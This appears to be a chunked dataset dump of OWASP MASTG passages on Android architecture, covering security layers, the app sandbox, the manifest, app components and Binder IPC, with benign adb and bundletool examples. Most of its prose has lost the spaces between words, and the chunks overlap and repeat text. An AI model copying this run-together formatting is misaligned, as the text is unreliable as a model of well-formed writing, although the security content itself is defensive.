downsidesofAOT.Atfirst, theapplicationwilluseJITcompilation, andAndroidkeepstrackofallthepartsofthe applicationthatarefrequentlyused. Thisinformationisstoredinanapplicationprofileandwhenthedeviceisidle, acompilation(dex2oat)daemonrunswhichAOTcompilestheidentifiedfrequentcodepathsfromtheprofile. 91\\nSource: https://lief-project.github.io/doc/latest/tutorials/10_android_formats.html Sandboxing: Androidappsdon’thavedirectaccesstohardwareresources,andeachapprunsinitsownvirtualmachine orsandbox. ThisenablestheOStohaveprecisecontroloverresourcesandmemoryaccessonthedevice. Forinstance, acrashingappdoesn’taffectotherappsrunningonthesamedevice. Androidcontrolsthemaximumnumberofsystem resources allocated to apps, preventing any one app from monopolizing too many resources. At the same time, this sandboxdesigncanbeconsideredasoneofthemanyprinciplesinAndroid’sglobaldefense-in-depthstrategy. Amalicious third-partyapplication,withlowprivileges,shouldn’tbeabletoescapeitsownruntimeandreadthememoryofavictim applicationonthesamedevice. InthefollowingsectionwetakeacloserlookatthedifferentdefenselayersintheAndroid operatingsystem. Learnmoreinthesection“SoftwareIsolation”. YoucanfindmoredetailedinformationintheGoogleSourcearticle“AndroidRuntime(ART)”,thebook“AndroidInternals” byJonathanLevinandtheblogpost“Android101”by@_qaz_qaz. Android Security: Defense-in-Depth Approach TheAndroidarchitectureimplementsdifferentsecuritylayersthat, together, enableadefense-in-depthapproach. This meansthattheconfidentiality,integrityoravailabilityofsensitiveuser-dataorapplicationsdoesn’thingeononesingle security measure. This section brings an overview of the different layers of defense that the Android system provides. Thesecuritystrategycanberoughlycategorizedintofourdistinctdomains,eachfocusingonprotectingagainstcertain attackmodels. • System-widesecurity • Softwareisolation • Networksecurity • Anti-exploitation System-wide security Device encryption AndroidsupportsdeviceencryptionfromAndroid2.3.4(APIlevel10)andithasundergonesomebigchangessincethen. GoogleimposedthatalldevicesrunningAndroid6.0(APIlevel23)orhigherhadtosupportstorageencryption,although somelow-enddeviceswereexemptbecauseitwouldsignificantlyimpacttheirperformance. • Full-DiskEncryption(FDE):Android5.0(APIlevel21)andabovesupportfull-diskencryption. Thisencryptionuses asinglekeyprotectedbytheuser’sdevicepasswordtoencryptanddecrypttheuserdatapartition. Thiskindof encryption is now considered deprecated and file-based encryption should be used whenever possible. Full-disk encryptionhasdrawbacks,suchasnotbeingabletoreceivecallsornothavingoperativealarmsafterarebootif theuserdoesnotenterthepasswordtounlock. 92\\n• File-BasedEncryption(FBE):Android7.0(APIlevel24)supportsfile-basedencryption. File-basedencryptionallows differentfilestobeencryptedwithdifferentkeyssotheycanbedecipheredindependently. Devicesthatsupport thistypeofencryptionsupportDirectBootaswell. DirectBootenablesthedevicetohaveaccesstofeaturessuch asalarmsoraccessibilityserviceseveniftheuserdidn’tunlockthedevice. Note: youmighthearofAdiantum,whichisanencryptionmethoddesignedfordevicesrunningAndroid9(APIlevel 28)andhigherwhoseCPUslackAESinstructions. Adiantum is only relevant for ROM developers or device vendors,AndroiddoesnotprovideanAPIfordeveloperstouseAdiantumfromapplications. Asrecommendedby Google,AdiantumshouldnotbeusedwhenshippingARM-baseddeviceswithARMv8CryptographyExtensionsor x86-baseddeviceswithAES-NI.AESisfasteronthoseplatforms. FurtherinformationisavailableintheAndroiddocumentation. Trusted Execution Environment (TEE) InorderfortheAndroidsystemtoperformencryptionitneedsawaytosecurelygenerate,importandstorecryptographic keys. Weareessentiallyshiftingtheproblemofkeepingsensitivedatasecuretowardskeepingacryptographickeysecure. Iftheattackercandumporguessthecryptographickey,thesensitiveencrypteddatacanberetrieved. Androidoffersatrustedexecutionenvironmentindedicatedhardwaretosolvetheproblemofsecurelygeneratingand protectingcryptographickeys. ThismeansthatadedicatedhardwarecomponentintheAndroidsystemisresponsible forhandlingcryptographickeymaterial. Threemainmodulesareresponsibleforthis: • Hardware-backed KeyStore: This module offers cryptographic services to the Android OS and third-party apps. It enables apps to perform cryptographic sensitive operations in an TEE without exposing the cryptographic key material. • StrongBox: InAndroid9(Pie),StrongBoxwasintroduced,anotherapproachtoimplementahardware-backedKey- Store. While previous to Android 9 Pie, a hardware-backed KeyStore would be any",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 55
    }
  },
  {
    "text": "forhandlingcryptographickeymaterial. Threemainmodulesareresponsibleforthis: • Hardware-backed KeyStore: This module offers cryptographic services to the Android OS and third-party apps. It enables apps to perform cryptographic sensitive operations in an TEE without exposing the cryptographic key material. • StrongBox: InAndroid9(Pie),StrongBoxwasintroduced,anotherapproachtoimplementahardware-backedKey- Store. While previous to Android 9 Pie, a hardware-backed KeyStore would be any TEE implementation that lies outside of the Android OS kernel. StrongBox is an actual complete separate hardware chip that is added to the deviceonwhichtheKeyStoreisimplementedandisclearlydefinedintheAndroiddocumentation. Youcancheck programmaticallywhetherakeyresidesinStrongBoxandifitdoes,youcanbesurethatitisprotectedbyahard- waresecuritymodulethathasitsownCPU,securestorage, andTrueRandomNumberGenerator(TRNG).Allthe sensitivecryptographicoperationshappenonthischip,inthesecureboundariesofStrongBox. • GateKeeper: TheGateKeepermoduleenablesdevicepatternandpasswordauthentication. Thesecuritysensitive operations during the authentication process happen inside the TEE that is available on the device. GateKeeper consistsofthreemaincomponents,(1)gatekeeperdwhichistheservicethatexposesGateKeeper,(2)GateKeeper HAL,whichisthehardwareinterfaceand(3)theTEEimplementationwhichistheactualsoftwarethatimplements theGateKeeperfunctionalityintheTEE. Verified Boot WeneedtohaveawaytoensurethatcodethatisbeingexecutedonAndroiddevicescomesfromatrustedsourceand thatitsintegrityisnotcompromised. Inordertoachievethis,Androidintroducedtheconceptofverifiedboot. Thegoalof verifiedbootistoestablishatrustrelationshipbetweenthehardwareandtheactualcodethatexecutesonthishardware. Duringtheverifiedbootsequence,afullchainoftrustisestablishedstartingfromthehardware-protectedRoot-of-Trust (RoT) up until the final system that is running, passing through and verifying all the required boot phases. When the Androidsystemisfinallybootedyoucanrestassuredthatthesystemisnottamperedwith. Youhavecryptographicproof thatthecodewhichisrunningistheonethatisintendedbytheOEMandnotonethathasbeenmaliciouslyoraccidentally altered. FurtherinformationisavailableintheAndroiddocumentation. Software Isolation Android Users and Groups EventhoughtheAndroidoperatingsystemisbasedonLinux,itdoesn’timplementuseraccountsinthesamewayother Unix-likesystemsdo. InAndroid,themulti-usersupportoftheLinuxkernelisusedtosandboxapps: withafewexceptions, 93\\neachapprunsasthoughunderaseparateLinuxuser,effectivelyisolatedfromotherappsandtherestoftheoperating system. Thefilesystem/core/include/private/android_filesystem_config.hincludesalistofthepredefinedusersandgroupssystem processesareassignedto. UIDs(userIDs)forotherapplicationsareaddedasthelatterareinstalled. Formoredetails, checkouttheblogpost“AnOverviewOfApplicationSandbox”byBinChenonAndroidsandboxing. Forexample,Android9.0(APIlevel28)definesthefollowingsystemusers: #defineAID_ROOT 0 /*traditionalunixrootuser*/ #... #defineAID_SYSTEM 1000 /*systemserver*/ #... #defineAID_SHELL 2000 /*adbanddebugshelluser*/ #... #defineAID_APP_START 10000 /*firstappuser*/ ... SELinux Security-EnhancedLinux(SELinux)usesaMandatoryAccessControl(MAC)systemtofurtherlockdownwhichprocesses shouldhaveaccesstowhichresources. Eachresourceisgivenalabelintheformofuser:role:type:mls_levelwhich defineswhichusersareabletoexecutewhichtypesofactionsonit. Forexample,oneprocessmayonlybeabletoread a file, while another process may be able to edit or delete the file. This way, by working on a least-privilege principle, vulnerableprocessesaremoredifficulttoexploitviaprivilegeescalationorlateralmovement. FurtherinformationisavailableontheAndroiddocumentation. Permissions Androidimplementsanextensivepermissionssystemthatisusedasanaccesscontrolmechanism. Itensurescontrolled accesstosensitiveuserdataanddeviceresources. Androidcategorizespermissionsintodifferenttypesofferingvarious protectionlevels. Prior to Android 6.0 (API level 23), all permissions an app requested were granted at installation (Install-time per- missions). FromAPIlevel23onwards,theusermustapprovesomepermissionsrequestsduringruntime(Runtime permissions). FurtherinformationisavailableintheAndroiddocumentationincludingseveralconsiderationsandbestpractices. TolearnhowtotestapppermissionsrefertotheTestingAppPermissionssectioninthe“AndroidPlatformAPIs”chapter. Network security TLS by Default Bydefault,sinceAndroid9(APIlevel28),allnetworkactivityistreatedasbeingexecutedinahostileenvironment. This means that the Android system will only allow apps to communicate over a network channel that is established using the Transport Layer Security (TLS) protocol. This protocol effectively encrypts all network traffic and creates a secure channeltoaserver. Itmaybethecasethatyouwouldwanttousecleartrafficconnectionsforlegacyreasons. Thiscan beachievedbyadaptingtheres/xml/network_security_config.xmlfileintheapplication. FurtherinformationisavailableintheAndroiddocumentation. DNS over TLS System-wideDNSoverTLSsupporthasbeenintroducedsinceAndroid9(APIlevel28). Itallowsyoutoperformqueries toDNSserversusingtheTLSprotocol. AsecurechannelisestablishedwiththeDNSserverthroughwhichtheDNSquery issent. ThisassuresthatnosensitivedataisexposedduringaDNSlookup. FurtherinformationisavailableontheAndroidDevelopersblog. 94\\nAnti-exploitation ASLR, KASLR, PIE and DEP AddressSpaceLayoutRandomization(ASLR),whichhasbeenpartofAndroidsinceAndroid4.1(APIlevel15),isastandard protectionagainstbuffer-overflowattacks,whichmakessurethatboththeapplicationandtheOSareloadedtorandom memoryaddressesmakingitdifficulttogetthecorrectaddressforaspecificmemoryregionorlibrary. InAndroid8.0(API level26),thisprotectionwasalsoimplementedforthekernel(KASLR).ASLRprotectionisonlypossibleiftheapplication canbeloadedatarandomplaceinmemory,whichisindicatedbythePositionIndependentExecutable(PIE)flagofthe application. Since Android 5.0 (API level 21), support for non-PIE enabled native libraries was dropped. Finally, Data ExecutionPrevention(DEP)preventscodeexecutiononthestackandheap,whichisalsousedtocombatbuffer-overflow exploits. FurtherinformationisavailableontheAndroidDevelopersblog. SECCOMP Filter AndroidapplicationscancontainnativecodewritteninCorC++. Thesecompiledbinariescancommunicatebothwith the Android Runtime through Java Native Interface (JNI) bindings, and with the OS through system calls. Some system calls are either not implemented, or are not supposed to be called by normal applications. As these system calls com- municatedirectlywiththekernel,theyareaprimetargetforexploitdevelopers. WithAndroid8(APIlevel26),Android hasintroducedthesupportforSecureComputing(SECCOMP)filtersforallZygotebasedprocesses(i.e.userapplications). Thesefiltersrestricttheavailablesyscallstothoseexposedthroughbionic. FurtherinformationisavailableontheAndroidDevelopersblog. Android Application Structure Communication with the Operating System Android apps interact with system services via the Android Framework, an abstraction layer that offers high-level Java APIs. ThemajorityoftheseservicesareinvokedvianormalJavamethodcallsandaretranslatedtoIPCcallstosystem servicesthatarerunninginthebackground. Examplesofsystemservicesinclude: • Connectivity(Wi-Fi,Bluetooth,NFC,etc.) • Files • Cameras • Geolocation(GPS) • Microphone Theframeworkalsoofferscommonsecurityfunctions,suchascryptography. TheAPIspecificationschangewitheverynewAndroidrelease. Criticalbugfixesandsecuritypatchesareusuallyapplied toearlierversionsaswell. NoteworthyAPIversions: • Android4.2(APIlevel16)inNovember2012(introductionofSELinux) • Android4.3(APIlevel18)inJuly2013(SELinuxbecameenabledbydefault) • Android4.4(APIlevel19)inOctober2013(severalnewAPIsandARTintroduced) • Android5.0(APIlevel21)inNovember2014(ARTusedbydefaultandmanyotherfeaturesadded) • Android 6.0 (API level 23) in October 2015 (many new features and improvements, including granting; detailed permissionssetupatruntimeratherthanallornothingduringinstallation) • Android7.0(APIlevel24-25)inAugust2016(newJITcompileronART) • Android8.0(APIlevel26-27)inAugust2017(alotofsecurityimprovements) • Android9(APIlevel28)inAugust2018(restrictionofbackgroundusageofmicorcamera,introductionoflockdown mode,defaultHTTPSforallapps) • Android 10 (API level 29)inSeptember2019(accesslocation“onlywhileusingtheapp”, devicetrackingpre- vention,improvesecureexternalstorage,) – Privacy(overview) 95\\n– Privacy(details1) – Privacy(details2) – Security(overview) – Security(details) • Android 11 (API level 30) in September 2020 (scoped storage enforcement, Permissions auto-reset, reduced packagevisibility,APKSignatureSchemev4) – Privacy(overview) – PrivacyBehaviorchanges(allapps) – SecurityBehaviorchanges(allapps) – PrivacyBehaviorchanges(appstargetingversion) – SecurityBehaviorchanges(appstargetingversion) • Android12(APIlevel31-32)inAugust2021(MaterialYou,Webintentresolution,PrivacyDashboard) – Securityandprivacy – Behaviorchanges(allapps) – Behaviorchanges(appstargetingversion) • Android13(APIlevel33)in2022(Saferexportingofcontext-registeredreceivers,newphotopicker) – Securityandprivacy – PrivacyBehaviorchanges(allapps)",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 56
    }
  },
  {
    "text": "– Privacy(overview) 95\\n– Privacy(details1) – Privacy(details2) – Security(overview) – Security(details) • Android 11 (API level 30) in September 2020 (scoped storage enforcement, Permissions auto-reset, reduced packagevisibility,APKSignatureSchemev4) – Privacy(overview) – PrivacyBehaviorchanges(allapps) – SecurityBehaviorchanges(allapps) – PrivacyBehaviorchanges(appstargetingversion) – SecurityBehaviorchanges(appstargetingversion) • Android12(APIlevel31-32)inAugust2021(MaterialYou,Webintentresolution,PrivacyDashboard) – Securityandprivacy – Behaviorchanges(allapps) – Behaviorchanges(appstargetingversion) • Android13(APIlevel33)in2022(Saferexportingofcontext-registeredreceivers,newphotopicker) – Securityandprivacy – PrivacyBehaviorchanges(allapps) – SecurityBehaviorchanges(allapps) – PrivacyBehaviorchanges(appstargetingversion) – SecurityBehaviorchanges(appstargetingversion) • Android14(APIlevel34)in2023: – Summaryofchanges – SecurityBehaviorchanges(allapps) – SecurityBehaviorchanges(appstargetingversion) Androiddevelopmentreleasesfollowauniquestructure. Theyareorganizedintofamiliesandgivenalphabeticalcode- namesinspiredbytastytreats. Youcanfindthemallhere. The App Sandbox AppsareexecutedintheAndroidApplicationSandbox,whichseparatestheappdataandcodeexecutionfromotherapps onthedevice. Asmentionedbefore,thisseparationaddsafirstlayerofdefense. Installationofanewappcreatesanewdirectorynamedaftertheapppackage,whichresultsinthefollowingpath: /data/ data/[package-name]. Thisdirectoryholdstheapp’sdata. Linuxdirectorypermissionsaresetsuchthatthedirectory canbereadfromandwrittentoonlywiththeapp’suniqueUID. We can confirm this by looking at the file system permissions in the /data/data folder. For example, we can see that GoogleChromeandCalendarareassignedonedirectoryeachandrununderdifferentuseraccounts: 96\\ndrwx------ 4u0_a97 u0_a97 40962017-01-1814:27com.android.calendar drwx------ 6u0_a120 u0_a120 40962017-01-1912:54com.android.chrome Developerswhowanttheirappstoshareacommonsandboxcansidestepsandboxing. Whentwoappsaresignedwith the same certificate and explicitly share the same user ID (having the sharedUserId in their AndroidManifest.xml files), eachcanaccesstheother’sdatadirectory. SeethefollowingexampletoachievethisintheNFCapp: <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.nfc\" android:sharedUserId=\"android.uid.nfc\"> Linux User Management AndroidleveragesLinuxusermanagementtoisolateapps. Thisapproachisdifferentfromusermanagementusagein traditional Linux environments, where multiple apps are often run by the same user. Android creates a unique UID for each Android app and runs the app in a separate process. Consequently, each app can access its own resources only. ThisprotectionisenforcedbytheLinuxkernel. Generally,appsareassignedUIDsintherangeof10000and99999. Androidappsreceiveausernamebasedontheir UID. For example, the app with UID 10188 receives the user name u0_a188. If the permissions an app requested are granted,thecorrespondinggroupIDisaddedtotheapp’sprocess. Forexample,theuserIDoftheappbelowis10188. ItbelongstothegroupID3003(inet). Thatgroupisrelatedtoandroid.permission.INTERNETpermission. Theoutputof theidcommandisshownbelow. $id uid=10188(u0_a188)gid=10188(u0_a188)groups=10188(u0_a188),3003(inet), 9997(everybody),50188(all_a188)context=u:r:untrusted_app:s0:c512,c768 TherelationshipbetweengroupIDsandpermissionsisdefinedinthefollowingfile: frameworks/base/data/etc/platform.xml <permission name=\"android.permission.INTERNET\" > <group gid=\"inet\" /> </permission> <permission name=\"android.permission.READ_LOGS\" > <group gid=\"log\" /> </permission> <permission name=\"android.permission.WRITE_MEDIA_STORAGE\" > <group gid=\"media_rw\" /> <group gid=\"sdcard_rw\" /> </permission> Zygote The process Zygote starts up during Android initialization. Zygote is a system service for launching apps. The Zygote process is a “base” process that contains all the core libraries the app needs. Upon launch, Zygote opens the socket /dev/socket/zygoteandlistensforconnectionsfromlocalclients. Whenitreceivesaconnection,itforksanewprocess, whichthenloadsandexecutestheapp-specificcode. App Lifecycle In Android, the lifetime of an app process is controlled by the operating system. A new Linux process is created when anappcomponentisstartedandthesameappdoesn’tyethaveanyothercomponentsrunning. Androidmaykillthis processwhenthelatterisnolongernecessaryorwhenreclaimingmemoryisnecessarytorunmoreimportantapps. The decisiontokillaprocessisprimarilyrelatedtothestateoftheuser’sinteractionwiththeprocess. Ingeneral,processes canbeinoneoffourstates. • Aforegroundprocess(e.g.,anactivityrunningatthetopofthescreenorarunningBroadcastReceiver) • Avisibleprocessisaprocessthattheuserisawareof,sokillingitwouldhaveanoticeablenegativeimpactonuser experience. Oneexampleisrunninganactivitythat’svisibletotheuseron-screenbutnotintheforeground. 97\\n• AserviceprocessisaprocesshostingaservicethathasbeenstartedwiththestartServicemethod. Thoughthese processesaren’tdirectlyvisibletotheuser,theyaregenerallythingsthattheusercaresabout(suchasbackground networkdatauploadordownload),sothesystemwillalwayskeepsuchprocessesrunningunlessthere’sinsufficient memorytoretainallforegroundandvisibleprocesses. • Acachedprocessisaprocessthat’snotcurrentlyneeded,sothesystemisfreetokillitwhenmemoryisneeded. Apps must implement callback methods that react to a number of events; for example, the onCreate handler is called when the app process is first created. Other callback methods include onLowMemory, onTrimMemory and onConfigurationChanged. App Bundles Android applications can be shipped in two forms: the Android Package Kit (APK) file or an Android App Bundle (.aab). AndroidAppBundlesprovidealltheresourcesnecessaryforanapp,butdeferthegenerationoftheAPKanditssigning toGooglePlay. AppBundlesaresignedbinarieswhichcontainthecodeoftheappinseveralmodules. Thebasemodule containsthecoreoftheapplication. Thebasemodulecanbeextendedwithvariousmoduleswhichcontainnewenrich- ments/functionalities for the app as further explained on the developer documentation for app bundle. If you have an AndroidAppBundle,youcanbestusethebundletoolcommandlinetoolfromGoogletobuildunsignedAPKsinorderto usetheexistingtoolingontheAPK.YoucancreateanAPKfromanAABfilebyrunningthefollowingcommand: bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks IfyouwanttocreatesignedAPKsreadyfordeploymenttoatestdevice,use: $bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks --ks=/MyApp/keystore.jks --ks-pass=file:/MyApp/keystore.pwd --ks-key-alias=MyKeyAlias --key-pass=file:/MyApp/key.pwd WerecommendthatyoutestboththeAPKwithandwithouttheadditionalmodules,sothatitbecomesclearwhetherthe additionalmodulesintroduceand/orfixsecurityissuesforthebasemodule. Android Manifest Every app has an Android Manifest file, which embeds content in binary XML format. The standard name of this file is AndroidManifest.xml. Itislocatedintherootdirectoryoftheapp’sAndroidPackageKit(APK)file. Themanifestfiledescribestheappstructure,itscomponents(activities,services,contentproviders,andintentreceivers), andrequestedpermissions. Italsocontainsgeneralappmetadata,suchastheapp’sicon,versionnumber,andtheme. Thefilemaylistotherinformation,suchascompatibleAPIs(minimal,targeted,andmaximalSDKversion)andthekind ofstorageitcanbeinstalledon(externalorinternal). Here is an example of a manifest file, including the package name (the convention is a reversed URL, but any string isacceptable). Italsoliststheappversion, relevantSDKs, requiredpermissions, exposedcontentproviders, broadcast receiversusedwithintentfiltersandadescriptionoftheappanditsactivities: <manifest package=\"com.owasp.myapplication\" android:versionCode=\"0.1\" > <uses-sdk android:minSdkVersion=\"12\" android:targetSdkVersion=\"22\" android:maxSdkVersion=\"25\" /> <uses-permission android:name=\"android.permission.INTERNET\" /> <provider android:name=\"com.owasp.myapplication.MyProvider\" android:exported=\"false\" /> <receiver android:name=\".MyReceiver\" > <intent-filter> <action android:name=\"com.owasp.myapplication.myaction\" /> </intent-filter>",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 57
    }
  },
  {
    "text": "an example of a manifest file, including the package name (the convention is a reversed URL, but any string isacceptable). Italsoliststheappversion, relevantSDKs, requiredpermissions, exposedcontentproviders, broadcast receiversusedwithintentfiltersandadescriptionoftheappanditsactivities: <manifest package=\"com.owasp.myapplication\" android:versionCode=\"0.1\" > <uses-sdk android:minSdkVersion=\"12\" android:targetSdkVersion=\"22\" android:maxSdkVersion=\"25\" /> <uses-permission android:name=\"android.permission.INTERNET\" /> <provider android:name=\"com.owasp.myapplication.MyProvider\" android:exported=\"false\" /> <receiver android:name=\".MyReceiver\" > <intent-filter> <action android:name=\"com.owasp.myapplication.myaction\" /> </intent-filter> 98\\n</receiver> <application android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/Theme.Material.Light\" > <activity android:name=\"com.owasp.myapplication.MainActivity\" > <intent-filter> <action android:name=\"android.intent.action.MAIN\" /> </intent-filter> </activity> </application> </manifest> ThefulllistofavailablemanifestoptionsisintheofficialAndroidManifestfiledocumentation. App Components Androidappsaremadeofseveralhigh-levelcomponents. Themaincomponentsare: • Activities • Fragments • Intents • Broadcastreceivers • Contentprovidersandservices All these elements are provided by the Android operating system, in the form of predefined classes available through APIs. Activities Activities make up the visible part of any app. There is one activity per screen, so an app with three different screens implementsthreedifferentactivities. ActivitiesaredeclaredbyextendingtheActivityclass. Theycontainalluserinterface elements: fragments,views,andlayouts. EachactivityneedstobedeclaredintheAndroidManifestwiththefollowingsyntax: <activity android:name=\"ActivityName\"> </activity> Activitiesnotdeclaredinthemanifestcan’tbedisplayed,andattemptingtolaunchthemwillraiseanexception. Likeapps,activitieshavetheirownlifecycleandneedtomonitorsystemchangestohandlethem. Activitiescanbein thefollowingstates: active,paused,stopped,andinactive. ThesestatesaremanagedbytheAndroidoperatingsystem. Accordingly,activitiescanimplementthefollowingeventmanagers: • onCreate • onSaveInstanceState • onStart • onResume • onRestoreInstanceState • onPause • onStop • onRestart • onDestroy Anappmaynotexplicitlyimplementalleventmanagers,inwhichcasedefaultactionsaretaken. Typically,atleastthe onCreatemanagerisoverriddenbytheappdevelopers. Thisishowmostuserinterfacecomponentsaredeclaredand initialized. onDestroymaybeoverriddenwhenresources(likenetworkconnectionsorconnectionstodatabases)must beexplicitlyreleasedorspecificactionsmustoccurwhentheappshutsdown. 99\\nFragments Afragmentrepresentsabehaviororaportionoftheuserinterfacewithintheactivity. FragmentswereintroducedAndroid withtheversionHoneycomb3.0(APIlevel11). Fragments are meant to encapsulate parts of the interface to facilitate re-usability and adaptation to different screen sizes. Fragmentsareautonomousentitiesinthattheyincludealltheirrequiredcomponents(theyhavetheirownlayout, buttons,etc.). However,theymustbeintegratedwithactivitiestobeuseful: fragmentscan’texistontheirown. They havetheirownlifecycle,whichistiedtothelifecycleoftheActivitiesthatimplementthem. Because fragments have their own life cycle, the Fragment class contains event managers that can be redefined and extended. TheseeventmanagersincludedonAttach,onCreate,onStart,onDestroyandonDetach. Severalothersexist; thereadershouldrefertotheAndroidFragmentspecificationformoredetails. FragmentscanbeeasilyimplementedbyextendingtheFragmentclassprovidedbyAndroid: ExampleinJava: public class MyFragment extends Fragment { ... } ExampleinKotlin: class MyFragment :Fragment(){ ... } Fragmentsdon’tneedtobedeclaredinmanifestfilesbecausetheydependonactivities. Tomanageitsfragments,anactivitycanuseaFragmentManager(FragmentManagerclass). Thisclassmakesiteasyto find,add,remove,andreplaceassociatedfragments. FragmentManagerscanbecreatedviathefollowing: ExampleinJava: FragmentManagerfm =getFragmentManager(); ExampleinKotlin: varfm=fragmentManager Fragments don’t necessarily have a user interface; they can be a convenient and efficient way to manage background operationspertainingtotheapp’suserinterface. Afragmentmaybedeclaredpersistentsothatifthesystempreserves itsstateevenifitsActivityisdestroyed. Content Providers Android uses SQLite to store data permanently: as with Linux, data is stored in files. SQLite is a light, efficient, open sourcerelationaldatastoragetechnologythatdoesnotrequiremuchprocessingpower,whichmakesitidealformobile use. An entire API with specific classes (Cursor, ContentValues, SQLiteOpenHelper, ContentProvider, ContentResolver, etc.) is available. SQLite is not run as a separate process; it is part of the app. By default, a database belonging to a givenappisaccessibletothisapponly. However,contentprovidersofferagreatmechanismforabstractingdatasources (includingdatabasesandflatfiles); theyalsoprovideastandardandefficientmechanismtosharedatabetweenapps, includingnativeapps. Tobeaccessibletootherapps,acontentproviderneedstobeexplicitlydeclaredinthemanifest file of the app that will share it. As long as content providers aren’t declared, they won’t be exported and can only be calledbytheappthatcreatesthem. ContentprovidersareimplementedthroughaURIaddressingscheme: theyallusethecontent://model. Regardlessof thetypeofsources(SQLitedatabase,flatfile,etc.),theaddressingschemeisalwaysthesame,therebyabstractingthe sources and offering the developer a unique scheme. Content providers offer all regular database operations: create, read,update,delete. Thatmeansthatanyappwithproperrightsinitsmanifestfilecanmanipulatethedatafromother apps. 100\\nServices ServicesareAndroidOScomponents(basedontheServiceclass)thatperformtasksinthebackground(dataprocessing, startingintents, andnotifications, etc.) withoutpresentingauserinterface. Servicesaremeanttorunprocesseslong- term. Theirsystemprioritiesarelowerthanthoseofactiveappsandhigherthanthoseofinactiveapps. Therefore,they arelesslikelytobekilledwhenthesystemneedsresources,andtheycanbeconfiguredtoautomaticallyrestartwhen enoughresourcesbecomeavailable. Thismakesservicesagreatcandidateforrunningbackgroundtasks. Pleasenote thatServices,likeActivities,areexecutedinthemainappthread. Aservicedoesnotcreateitsownthreadanddoesnot runinaseparateprocessunlessyouspecifyotherwise. Inter-Process Communication As we’ve already learned, every Android process has its own sandboxed address space. Inter-process communication facilitiesallowappstoexchangesignalsanddatasecurely. InsteadofrelyingonthedefaultLinuxIPCfacilities,Android’s IPC is based on Binder, a custom implementation of OpenBinder. Most Android system services and all high-level IPC servicesdependonBinder. ThetermBinderstandsforalotofdifferentthings,including: • BinderDriver: thekernel-leveldriver • BinderProtocol: low-levelioctl-basedprotocolusedtocommunicatewiththebinderdriver • IBinderInterface: awell-definedbehaviorthatBinderobjectsimplement • Binderobject: genericimplementationoftheIBinderinterface • Binderservice: implementationoftheBinderobject;forexample,locationservice,andsensorservice • Binderclient: anobjectusingtheBinderservice TheBinderframeworkincludesaclient-servercommunicationmodel. TouseIPC,appscallIPCmethodsinproxyobjects. TheproxyobjectstransparentlymarshallthecallparametersintoaparcelandsendatransactiontotheBinderserver, whichisimplementedasacharacterdriver(/dev/binder). Theserverholdsathreadpoolforhandlingincomingrequests anddeliversmessagestothedestinationobject. Fromtheperspectiveoftheclientapp,allofthisseemslikearegular methodcall,alltheheavyliftingisdonebytheBinderframework. • BinderOverview-Imagesource: AndroidBinderbyThorstenSchreiber Servicesthatallowotherapplicationstobindtothemarecalledboundservices. TheseservicesmustprovideanIBinder interface to clients. Developers use the Android Interface Descriptor Language (AIDL) to write interfaces for remote services. ServiceManagerisasystemdaemonthatmanagestheregistrationandlookupofsystemservices. Itmaintainsalistof name/Binderpairsforallregisteredservices. ServicesareaddedwithaddServiceandretrievedbynamewiththestatic getServicemethodinandroid.os.ServiceManager: ExampleinJava: 101\\npublic static IBinder getService(Stringname){ try{ IBinderservice =sCache.get(name); if(service !=null){ return service; }else { return getIServiceManager().getService(name);",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 58
    }
  },
  {
    "text": "TouseIPC,appscallIPCmethodsinproxyobjects. TheproxyobjectstransparentlymarshallthecallparametersintoaparcelandsendatransactiontotheBinderserver, whichisimplementedasacharacterdriver(/dev/binder). Theserverholdsathreadpoolforhandlingincomingrequests anddeliversmessagestothedestinationobject. Fromtheperspectiveoftheclientapp,allofthisseemslikearegular methodcall,alltheheavyliftingisdonebytheBinderframework. • BinderOverview-Imagesource: AndroidBinderbyThorstenSchreiber Servicesthatallowotherapplicationstobindtothemarecalledboundservices. TheseservicesmustprovideanIBinder interface to clients. Developers use the Android Interface Descriptor Language (AIDL) to write interfaces for remote services. ServiceManagerisasystemdaemonthatmanagestheregistrationandlookupofsystemservices. Itmaintainsalistof name/Binderpairsforallregisteredservices. ServicesareaddedwithaddServiceandretrievedbynamewiththestatic getServicemethodinandroid.os.ServiceManager: ExampleinJava: 101\\npublic static IBinder getService(Stringname){ try{ IBinderservice =sCache.get(name); if(service !=null){ return service; }else { return getIServiceManager().getService(name); } }catch (RemoteExceptione){ Log.e(TAG,\"erroringetService\",e); } return null; } ExampleinKotlin: companion object { private valsCache:Map<String,IBinder>=ArrayMap() fungetService(name:String):IBinder?{ try{ valservice =sCache[name] return service ?:getIServiceManager().getService(name) }catch (e:RemoteException){ Log.e(FragmentActivity.TAG,\"erroringetService\",e) } return null } } Youcanquerythelistofsystemserviceswiththeservice listcommand. $adbshellservicelist Found99services: 0carrier_config: [com.android.internal.telephony.ICarrierConfigLoader] 1phone: [com.android.internal.telephony.ITelephony] 2isms: [com.android.internal.telephony.ISms] 3iphonesubinfo: [com.android.internal.telephony.IPhoneSubInfo] Intents IntentmessagingisanasynchronouscommunicationframeworkbuiltontopofBinder. Thisframeworkallowsbothpoint- to-pointandpublish-subscribemessaging. AnIntent isamessagingobjectthatcanbeusedtorequestanactionfrom another app component. Although intents facilitate inter-component communication in several ways, there are three fundamentalusecases: • Startinganactivity – An activity represents a single screen in an app. You can start a new instance of an activity by passing an intenttostartActivity. Theintentdescribestheactivityandcarriesnecessarydata. • Startingaservice – AServiceisacomponentthatperformsoperationsinthebackground,withoutauserinterface. WithAndroid 5.0(APIlevel21)andlater,youcanstartaservicewithJobScheduler. • Deliveringabroadcast – Abroadcastisamessagethatanyappcanreceive. Thesystemdeliversbroadcastsforsystemevents,includ- ingsystembootandcharginginitialization. Youcandeliverabroadcasttootherappsbypassinganintentto sendBroadcastorsendOrderedBroadcast. Therearetwotypesofintents. Explicitintentsnamethecomponentthatwillbestarted(thefullyqualifiedclassname). Forinstance: ExampleinJava: Intentintent =newIntent(this,myActivity.myClass); ExampleinKotlin: 102\\nvarintent =Intent(this,myActivity.myClass) 